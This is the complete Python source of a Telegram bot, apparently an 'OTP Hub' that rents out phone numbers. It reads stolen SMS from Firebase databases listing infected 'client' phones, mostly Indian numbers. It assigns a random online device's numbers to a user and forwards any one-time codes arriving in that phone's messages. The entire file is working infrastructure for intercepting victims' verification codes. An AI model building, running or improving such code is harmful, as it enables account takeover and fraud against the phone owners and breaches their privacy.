import asyncio, os, time, logging, random
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

import database as db
import firebase_utils as fbu
import shelex_utils as shelex

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("OTP-Bot")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = 8480878371
PORT = int(os.getenv("PORT", 8080))

router = Router()
running_bots = {}
active_scans = {}
git_leases = {}

class AdminStates(StatesGroup):
    add_url = State()
    add_bulk_urls = State()

async def get_owner_stats():
    data = db.load_data()
    fbs = data.get("firebases", [])
    
    async def fetch_single_fb(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        fb_online = 0
        fb_total = 0
        if clients and isinstance(clients, dict):
            fb_total = len(clients)
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    fb_online += 1
        return fb, fb_online, fb_total

    tasks = [fetch_single_fb(fb) for fb in fbs]
    results = await asyncio.gather(*tasks)
    
    total_devices, online_devices = 0, 0
    stats_list = []
    for fb, online, total in results:
        stats_list.append({"fb": fb, "online": online, "total": total})
        total_devices += total
        online_devices += online
    return total_devices, online_devices, stats_list

async def send_otp_to_user(uid, service, otp, msg_text):
    otp_msg = (
        f"🔔 <b>OTP Received!</b>\n\n"
        f"📱 <b>Service:</b> {service}\n"
        f"🔑 <b>OTP:</b> {otp}\n\n"
        f"💬 <b>Msg:</b> {msg_text[:100]}..."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]])
    try:
        bot = running_bots.get(BOT_TOKEN)
        if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
    except Exception: pass

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fbu.fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

async def background_scanner():
    log.info("Global Scanner Started...")
    while True:
        try:
            data = db.load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            device_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            if device_to_users:
                for fb in fbs:
                    latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                    for dev_id, msg in latest_msgs.items():
                        key = (fb["url"], dev_id)
                        msg_id = int(msg.get("id", 0))
                        old_id = active_scans.get(key, 0)
                        if msg_id > old_id:
                            active_scans[key] = msg_id
                            if old_id != 0: 
                                text_content = msg.get("message", "")
                                otp = fbu.extract_otp(text_content)
                                if otp and dev_id in device_to_users:
                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        await send_otp_to_user(uid, service, otp, text_content)

            for uid, s_data in list(git_leases.items()):
                if time.time() > s_data["expire_at"]:
                    del git_leases[uid]
                    continue
                res = await shelex.get_sms(s_data["country"], s_data["phone"])
                if res and isinstance(res, dict) and res.get("sms"):
                    sms_text = res["sms"]
                    if sms_text != s_data["last_sms"]:
                        s_data["last_sms"] = sms_text
                        otp = fbu.extract_otp(sms_text)
                        if otp:
                            await send_otp_to_user(uid, "Git Server", otp, sms_text)
            await asyncio.sleep(3)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)

def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
        [InlineKeyboardButton(text="⭐ My Numbers", callback_data="user:my_numbers")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Enter as User (Test)", callback_data="user:home")],
        [InlineKeyboardButton(text="🔥 Manage Servers", callback_data="admin:manage_fb")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = db.load_data()
    uid = msg.from_user.id
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "starred": {}}
        db.save_data(data)
    
    if uid == data["owner_id"] or uid in data.get("admins", []):
        try: await msg.answer("⏳ <i>Loading analytics...</i>", parse_mode="HTML")
        except TelegramBadRequest: pass
        await admin_home_msg(msg)
    else:
        if not data.get("free_mode", True): return await msg.answer("⛔ Access Denied.")
        await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")

async def admin_home_msg(msg: Message):
    total, online, stats_list = await get_owner_stats()
    text = (
        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
        f"🔥 <b>Total Servers:</b> {len(stats_list)}\n"
        f"📱 <b>Total Devices:</b> {total}\n"
        f"🟢 <b>Online Devices:</b> {online}\n"
        f"👥 <b>Total Users:</b> {len(db.load_data().get('users', {}))}\n\n"
        f"<b>Servers List:</b>\n"
    )
    # 🔥 FIX: Owner ab proper Fire Server No, Label aur URL dekh sakta hai
    for i, stat in enumerate(stats_list):
        fb = stat["fb"]
        text += f"{i+1}. Fire Server {i+1} | {fb['label']} | <code>{fb['url']}</code>\n└ {stat['online']} ON / {stat['total']} Total\n\n"
    try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:home")
async def admin_home_cb(cq: CallbackQuery):
    try: await cq.message.edit_text("🔄 Refreshing live analytics...")
    except TelegramBadRequest: pass
    await admin_home_msg(cq.message)

@router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    data = db.load_data()
    fbs = data.get("firebases", [])
    if not fbs: 
        kb = [[InlineKeyboardButton(text="➕ Add URL", callback_data="admin:add_url")], [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
        return await cq.message.edit_text("No servers added yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    
    kb = []
    for i, fb in enumerate(fbs):
        short_url = fb['url'].split('//')[-1][:15]
        kb.append([
            InlineKeyboardButton(text=f"🔥 Fire {i+1} | {fb['label']}", callback_data=f"admin:viewfb:{i}"),
            InlineKeyboardButton(text="❌", callback_data=f"admin:rmfb:{i}")
        ])
    
    kb.append([InlineKeyboardButton(text="➕ Add URL", callback_data="admin:add_url")])
    kb.append([InlineKeyboardButton(text="📁 Bulk Add", callback_data="admin:add_bulk")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
    
    try: await cq.message.edit_text("Manage Servers (Tap ❌ to remove):", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:add_url")
async def admin_add_url_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_url)
    await cq.message.edit_text("Send URL in this format:\n<code>URL | Country Name</code>\n\nExample:\n<code>https://xyz.firebaseio.com | India</code>", parse_mode="HTML")

@router.message(AdminStates.add_url)
async def admin_add_url_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    text = msg.text.strip()
    if "|" not in text:
        return await msg.answer("❌ Invalid format. Use <code>URL | Country Name</code>", parse_mode="HTML")
    parts = text.split("|")
    url = parts[0].strip()
    label = parts[1].strip()
    
    if url.startswith("http"):
        if "#DARKs=" in url or "?s=" in url:
            decoded = fbu.decode_panel_url(url)
            if decoded: url = decoded[0]
            
        # 🔥 FIX: Agar user galti se label mein URL daal de toh default India kardo
        if "http" in label or "rtdb" in label or "firebase" in label:
            label = "India"
            await msg.answer("⚠️ Label looked like a URL. Defaulted to 'India'.")
            
        data["firebases"].append({"url": url, "label": label, "auth": ""})
        db.save_data(data)
        await msg.answer(f"✅ Server added for {label}!", reply_markup=admin_kb())
    else:
        await msg.answer("❌ URL must start with http")

@router.callback_query(F.data == "admin:add_bulk")
async def admin_add_bulk_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_bulk_urls)
    await cq.message.edit_text("Send URLs in this format:\n<code>URL | Country Name</code> (one per line)", parse_mode="HTML")

@router.message(AdminStates.add_bulk_urls)
async def admin_add_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    added = 0
    for line in msg.text.strip().split("\n"):
        if "|" in line:
            parts = line.split("|")
            url = parts[0].strip()
            label = parts[1].strip()
            if url.startswith("http"):
                if "#DARKs=" in url or "?s=" in url:
                    decoded = fbu.decode_panel_url(url)
                    if decoded: url = decoded[0]
                
                if "http" in label or "rtdb" in label or "firebase" in label:
                    label = "India"
                    
                data["firebases"].append({"url": url, "label": label, "auth": ""})
                added += 1
    db.save_data(data)
    await msg.answer(f"✅ Added {added} servers successfully!", reply_markup=admin_kb())

@router.callback_query(F.data.startswith("admin:rmfb:"))
async def admin_rmfb(cq: CallbackQuery):
    idx = int(cq.data.split(":")[2])
    data = db.load_data()
    if 0 <= idx < len(data["firebases"]):
        del data["firebases"][idx]
        db.save_data(data)
    await cq.answer("✅ Removed!")
    await admin_manage_fb(cq)

@router.callback_query(F.data.startswith("admin:viewfb:"))
async def admin_viewfb(cq: CallbackQuery):
    idx = int(cq.data.split(":")[2])
    data = db.load_data()
    fb = data["firebases"][idx]
    try: await cq.message.edit_text("🔄 Fetching devices...")
    except TelegramBadRequest: pass
    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    if not clients: return await cq.message.edit_text("❌ No devices found.", reply_markup=admin_kb())
    
    # 🔥 FIX: Owner can see URL properly here
    text = f"📁 <b>Server:</b> {fb['label']}\n🔗 <b>URL:</b> <code>{fb['url']}</code>\n\n"
    count = 0
    for dev_id, dev_info in clients.items():
        if isinstance(dev_info, dict):
            status = "🟢 Online" if dev_info.get("status") else "🔴 Offline"
            battery = dev_info.get("battery", "?")
            text += f"🆔 <code>{dev_id}</code>\n{status} | 🔋 {battery}\n\n"
            count += 1
            if count >= 15: break
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:manage_fb")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    try: await cq.message.edit_text("👋 <b>Welcome!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    data = db.load_data()
    fb_countries = list(set([fb["label"] for fb in data.get("firebases", [])]))
    shelex_countries = await shelex.get_countries()
    all_countries = list(set(fb_countries + shelex_countries))
    all_countries.sort()
    kb = []
    for c in all_countries[:40]:
        kb.append([InlineKeyboardButton(text=f"🏳️ {c}", callback_data=f"country:{c}")])
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text("🌍 <b>Select a Country:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("country:"))
async def user_country_selected(cq: CallbackQuery):
    country = cq.data.split(":")[1]
    data = db.load_data()
    fbs = [fb for fb in data.get("firebases", []) if fb["label"].lower() == country.lower()]
    kb = []
    for i, fb in enumerate(fbs):
        kb.append([InlineKeyboardButton(text=f"🔥 Fire Server {i+1}", callback_data=f"server:fb:{country}:{i}")])
    kb.append([InlineKeyboardButton(text="🕸️ Git Server", callback_data=f"server:git:{country}")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num")])
    try: await cq.message.edit_text(f"🌍 {country} - Select a Server:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("server:fb:"))
async def user_fb_server(cq: CallbackQuery):
    parts = cq.data.split(":")
    country = parts[2]
    idx = int(parts[3])
    data = db.load_data()
    fbs = [fb for fb in data.get("firebases", []) if fb["label"].lower() == country.lower()]
    if idx >= len(fbs): return await cq.answer("Server not found.")
    fb = fbs[idx]
    uid = cq.from_user.id
    try: await cq.message.edit_text("🔄 Fetching devices...")
    except TelegramBadRequest: pass
    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    if not clients: return await cq.answer("❌ No devices online on this Fire Server.", show_alert=True)
    online_devices = [dev_id for dev_id, d in clients.items() if isinstance(d, dict) and d.get("status") is True]
    if not online_devices: return await cq.answer("❌ All devices are offline.", show_alert=True)
    dev_id = random.choice(online_devices)
    dev_data = clients[dev_id]
    url = f"{fb['url']}/messages/{dev_id}.json?limitToLast=100"
    msgs_dict = await fbu.fetch_fb(url, fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb["url"], "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600
    }
    db.save_data(data)
    nums_text = "\n".join([f"<code>+91{n}</code> ({c}%)" for n, c in best_nums]) if best_nums else "No numbers found in recent messages. (Waiting for new OTPs...)"
    battery = str(dev_data.get("battery", "100")).replace("%", "")
    if not battery or battery == "?": battery = "100"
    text = (
        f"📱 <b>Numbers Received</b>\n"
        f"🔥 Server: {fb['label']} (Fire Server {idx+1})\n"
        f"🆔 Rent Code: <code>{dev_id}</code>\n"
        f"⚙️ Code: <code>{battery}T</code>\n\n"
        f"{nums_text}\n\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    kb = [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [InlineKeyboardButton(text="⭐ Save to My Numbers", callback_data=f"star:{dev_id}")],
        [InlineKeyboardButton(text="🔙 Back", callback_data=f"country:{country}")]
    ]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("server:git:"))
async def user_git_server(cq: CallbackQuery):
    country = cq.data.split(":")[2]
    uid = cq.from_user.id
    try: await cq.message.edit_text(f"🔄 Fetching {country} numbers from Git Server...")
    except TelegramBadRequest: pass
    numbers = await shelex.get_numbers(country)
    if not numbers: return await cq.answer("❌ No numbers available on Git Server right now.", show_alert=True)
    kb = []
    for num in numbers[:5]:
        kb.append([InlineKeyboardButton(text=f"📞 +{num}", callback_data=f"git_sel:{country}:{num}")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data=f"country:{country}")])
    try: await cq.message.edit_text(f"🌍 {country} - Git Server Numbers:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("git_sel:"))
async def user_git_select(cq: CallbackQuery):
    parts = cq.data.split(":")
    country = parts[1]
    phone = parts[2]
    uid = cq.from_user.id
    git_leases[uid] = {
        "country": country, "phone": phone, "last_sms": "", "expire_at": int(time.time()) + 1200
    }
    text = (
        f"📱 <b>Git Server Number</b>\n"
        f"🕸️ Server: Git Server\n"
        f"📞 Number: <code>+{phone}</code>\n\n"
        f"⌛ <i>Waiting for OTP (20 Mins)...</i>"
    )
    kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("star:"))
async def star_device(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    data = db.load_data()
    if str(uid) not in data["users"]: return await cq.answer("User not found!")
    starred = data["users"][str(uid)].setdefault("starred", {})
    if dev_id in starred:
        del starred[dev_id]
        await cq.answer("❌ Removed from My Numbers!")
    else:
        lease = data["user_leases"].get(str(uid), {})
        starred[dev_id] = {"numbers": lease.get("numbers", []), "country": lease.get("country", "Unknown")}
        await cq.answer("⭐ Saved to My Numbers!")
    db.save_data(data)

@router.callback_query(F.data == "user:my_numbers")
async def user_my_numbers(cq: CallbackQuery):
    uid = cq.from_user.id
    data = db.load_data()
    starred = data["users"].get(str(uid), {}).get("starred", {})
    if not starred:
        kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        return await cq.message.edit_text("⭐ <b>My Numbers</b>\n\nNo saved numbers yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    text = "⭐ <b>My Numbers</b>\n\nTap to re-access OTPs:\n"
    kb = []
    for dev_id, info in starred.items():
        kb.append([
            InlineKeyboardButton(text=f"🆔 {dev_id}", callback_data=f"access:{dev_id}"),
            InlineKeyboardButton(text="🗑", callback_data=f"star:{dev_id}")
        ])
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("access:"))
async def access_saved_device(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    data = db.load_data()
    starred = data["users"].get(str(uid), {}).get("starred", {})
    if dev_id not in starred: return await cq.answer("Device not saved!")
    is_online = False
    for fb in data.get("firebases", []):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if clients and dev_id in clients:
            if clients[dev_id].get("status") is True: is_online = True
            break
    if not is_online: return await cq.answer("❌ Not in range pls try again after some time", show_alert=True)
    info = starred[dev_id]
    data["user_leases"][str(uid)] = {
        "numbers": info["numbers"], "country": info["country"], "dev_id": dev_id, "expire_at": int(time.time()) + 3600
    }
    db.save_data(data)
    nums_text = "\n".join([f"<code>+91{n}</code>" for n in info["numbers"]]) if info["numbers"] else "No numbers found."
    text = (
        f"📱 <b>Re-Accessed Device</b>\n"
        f"🆔 <b>Rent Code:</b> <code>{dev_id}</code>\n\n"
        f"{nums_text}\n\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    kb = [[InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))], [InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

async def main():
    log.info("Bot Started!")
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    main_bot = Bot(token=BOT_TOKEN)
    running_bots[BOT_TOKEN] = main_bot
    asyncio.create_task(background_scanner())
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(main_bot)

if __name__ == "__main__":
    asyncio.run(main())
